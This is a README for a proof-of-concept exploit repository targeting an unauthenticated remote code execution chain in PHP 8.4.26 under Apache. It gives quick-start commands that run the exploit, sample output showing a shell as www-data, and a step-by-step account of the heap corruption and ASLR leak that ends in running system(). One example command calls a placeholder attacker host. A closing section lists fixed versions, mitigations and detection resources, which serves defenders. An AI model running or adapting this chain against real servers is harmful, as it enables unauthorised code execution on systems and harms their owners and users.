# php2shell-poc — one-shot pre-auth RCE on stock PHP 8.4.26 (Apache)

CVE-2026-109618 / CVE-2026-109619 ("php2shell") — a single-file, pure-HTTP
exploit that turns PHP's `session.upload_progress` OOM bailout into remote
code execution against the **official `php:8.4.26-apache` Docker image with
the untouched `php.ini-production`**:

- `display_errors=Off`, `memory_limit=128M`, `post_max_size=8M`
- no application code, no `session_start()`, no target-side files, no gdb
- pre-auth, ASLR defeated via an in-band heap leak, ~2 s per attempt

> **Authorized security research only.** This repository exists for
> reproducing the vulnerability in a lab you own. Do not point it at systems
> you do not have explicit permission to test. Fixed versions: PHP 8.2.35,
> 8.3.36, 8.4.27, 8.5.12 (commit `3584a98bda`).

## Quick start

```bash
# 1. start the vulnerable lab (single-worker prefork, stock php.ini-production)
cd lab
docker compose up -d
cd ..

# 2. fire the chain (restart = fresh ASLR each run)
python3 exploit/php2shell_poc.py --port 18110 --restart p2s-pure-18110
```

Expected output:

```
[try 1] A1: END-cleanup send_cookie OOM
[try 1] B1: stale-id OOB read (chunk base + libphp)
      decoded=819208 zval_ptr_dtor=0x7707c3eefb60 -> libphp=0x7707c3891000
      chunk buckets: [('0x7707c1400000', 7495), ('0x7707c3e00000', 1095), ('0x7707c1c00000', 87), ('0x7707c1200000', 79)]
[try 1] A2 + B2: main=0x7707c1c00000 S=0x7707c1cf8398 zif_system=0x7707c3cf6370
[4/4] RCE OK:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Validated 6/6 first-try runs in our lab (fresh container each time and warm
worker). Arbitrary command (max ~200 bytes):

```bash
python3 exploit/php2shell_poc.py --port 18110 --restart p2s-pure-18110 \
    --cmd 'php -r "file_get_contents(\"http://ATTACKER/ok\");"'
```

The proof of the default command `id>/out/p1` is read back automatically
(local `lab/out/p1` or `docker exec ... cat /out/p1`).

## The chain

| Step | Request | Effect |
|------|---------|--------|
| A1 | chunked multipart, 860 depth-64 nested file fields + 78 x 8000 B values + 5 query params | OOM inside `php_url_encode` during the rfc1867 END cleanup leaves `PS(id)`, `PS(send_cookie)`, `PS(mod_data)` dangling in the worker |
| B1 | 16 full-chunk forge values + 900 array fields, chunked | forged `zend_string` header re-activates the stale id chunk; `Set-Cookie` carries an 800 KB out-of-bounds read → **libphp base** (1095 hits of `zval_ptr_dtor`) and **main chunk base** (the 2 MiB bucket holding exactly 87 pointers) |
| A2 | plain multipart, 880 nested fields + 115 fillers | cheap OOM leaves `PS(hash_serialize_verifier)` dangling at `main+0x7D720` |
| B2 | plain multipart, 995 x 384 B spray values + `ht` field | the dangling verifier is overwritten with a reference to a fake `zend_array` whose `pDestructor` is `zif_system`; request shutdown runs `system(cmd)` |

Two primitives make the default-config chain possible:

- **`Transfer-Encoding: chunked` bypasses `post_max_size`**: without
  `Content-Length`, `SG(request_info).content_length = 0` and the rfc1867
  handler skips the size check, so arbitrarily large multipart bodies can
  shape the heap under a stock 128M/8M configuration.
- **Leak instead of guess**: both ASLR bases come out of the same 800 KB
  window, with a plausibility check on `libphp - main`
  (0x1A00000–0x1F00000); bad leaks are discarded and the chain re-runs.

## Differences from the base exploit

This is a repackaging of the public chain in
[9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
(commit `aeb5dcc`, 2026-10-22), with two changes:

1. **Everything in one stdlib-only file** (`exploit/php2shell_poc.py`) —
   all body builders, the chunked/plain senders, the leak decoder and the
   orchestration; no repository-relative dependencies.
2. **Wide pointer filter in the leak decoder** (`0x500000000000–0x800000000000`
   instead of `0x7f0000000000–0x7fffffffffff`): on kernels where `mmap_base`
   places the heap below `0x7f` (e.g. WSL2: `0x71..`/`0x7c..`) the original
   filter sees zero pointers. This is the only functional change.

## Scope and limitations

- Constants (`zval_ptr_dtor`, `zif_system`, `S`, the request shapes) are
  bound to the **official `php:8.4.26-apache` image** (Debian trixie,
  x86-64, NTS, prefork). Other versions/builds need re-derived offsets and
  re-calibrated field counts.
- Apache mod_php only. The php-fpm variant of the stale-state bug
  (Chain E in the disclosure research) is a different chain.
- The OOM primitive requires a finite `memory_limit`; `memory_limit=-1`
  removes the predictable allocation failure the chain depends on.
- A and B must land on the same worker: the lab pins a single prefork child.
  On a multi-worker deployment you need retries/spraying.
- Not for patched PHP (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12+), and the
  offsets only fit 8.4.26.

## Mitigations / detection (defensive)

- **Update PHP** — the only complete fix (`3584a98bda`).
- `session.upload_progress.enabled=Off` does **not** fix CVE-2026-109618
  (the OOM path does not require upload_progress).
- Blocking `PHP_SESSION_UPLOAD_PROGRESS` in multipart bodies at the edge
  breaks every request of this chain (near-zero legitimate use).
- See [ikow/php2shell-poc](https://github.com/ikow/php2shell-poc) for
  ready-made Suricata/Sigma/ModSecurity/OpenResty rules and a patch-gap
  analysis, plus the
  [JFrog](https://research.jfrog.com/post/php2shell-all-you-need-to-know-about-cve-2026-109618-and-cve-2026-109619/)
  and [Wiz](https://www.wiz.io/blog/php2shell-php-rce) writeups.

## Credits

- **9bie** — the full pure-HTTP chain on stock `php.ini-production`
  (`php2shell-bypass-aslr-exp`), which this PoC packages.
- **Qi Deng (@ikow)** — php2shell disclosure research, five-chain analysis
  and the detection toolkit.
- PHP core developers — the fix and the advisory discussion.

## License

MIT — see [LICENSE](LICENSE). The underlying exploit logic belongs to its
authors; this repository adds packaging and the WSL2 leak-decoder fix.
